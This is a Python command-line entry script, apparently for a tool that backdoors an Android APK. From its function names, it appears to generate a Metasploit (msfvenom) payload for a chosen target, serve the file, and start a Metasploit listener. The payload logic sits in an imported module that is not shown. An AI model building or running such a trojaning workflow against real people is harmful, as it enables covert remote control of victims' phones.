#!/usr/bin/env python3

from mods.functions import *
import mods.functions as fu
from mods.args import *

if args.apk != None and args.mode == 'auto':
    print(banner)
    
    if os.path.exists(apk):
        name()

        if len(fu.target_name) > 1:
            getip()
            getport()
            getpayloadtype()
            direct_venom()
            start_srv()
            start_msf()
        else:
            sys.exit(color.RED+"[-] No target name was specified"+color.END)
    else:
        sys.exit(color.RED+"[-] The specified apk doesn't exist"+color.END)
    
elif args.apk != None and args.mode == 'manual':
    print(banner)
    print("*"*11)
    print(color.DARKCYAN+"Coming soon...(but probably not tbh)"+color.END)
    print("*"*11)

else:
    parser.error("A required argument is missing")
